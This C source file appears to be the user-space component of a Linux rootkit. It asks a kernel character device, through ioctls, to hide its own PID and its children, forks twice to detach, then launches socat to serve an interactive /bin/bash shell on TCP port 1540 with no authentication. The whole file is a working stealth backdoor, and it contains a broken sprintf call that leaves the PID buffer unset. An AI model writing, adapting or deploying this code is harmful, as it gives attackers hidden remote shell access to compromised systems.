#include "chardev.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stropts.h>
#include <getopt.h>

#define PATH_TO_SOCAT	"/usr/bin/socat"

int sendIOCTL(unsigned long request, char *ioctl_string) {
	int fd;
	char name_file[120];
	sprintf(name_file, "%s%s", DEVICE_PATH,DEVICE_NAME);
	fd = open(name_file, O_RDWR);

	if (fd == -1) {
		fprintf(stderr,"Error, ioctl channel file at %s could not be opened.\n",name_file);
		exit(-1);
	}
	ioctl(fd,request,ioctl_string);
	close(fd);
	return 0;
}

int main(){
	pid_t my_pid = getpid();
	char address[100];
	sprintf("%ul", (unsigned long)my_pid);
	sendIOCTL(IOCTL_SET_PID_TO_HIDE, address);
	sendIOCTL(IOCTL_HIDE_CHILDREN_ON, "");

	pid_t new_pid = fork();

	if(new_pid != 0){
		exit(-1);
	}

	pid_t new_pid2 = fork();

	if(new_pid2 != 0){
		exit(-1);
	}
	char *const arg[] = {"socat", "tcp-listen:1540,fork,reuseaddr" ,"exec:/bin/bash,pty,stderr,setsid",NULL };
	char *const env[] = {NULL};

	execve(PATH_TO_SOCAT, arg, env);
}
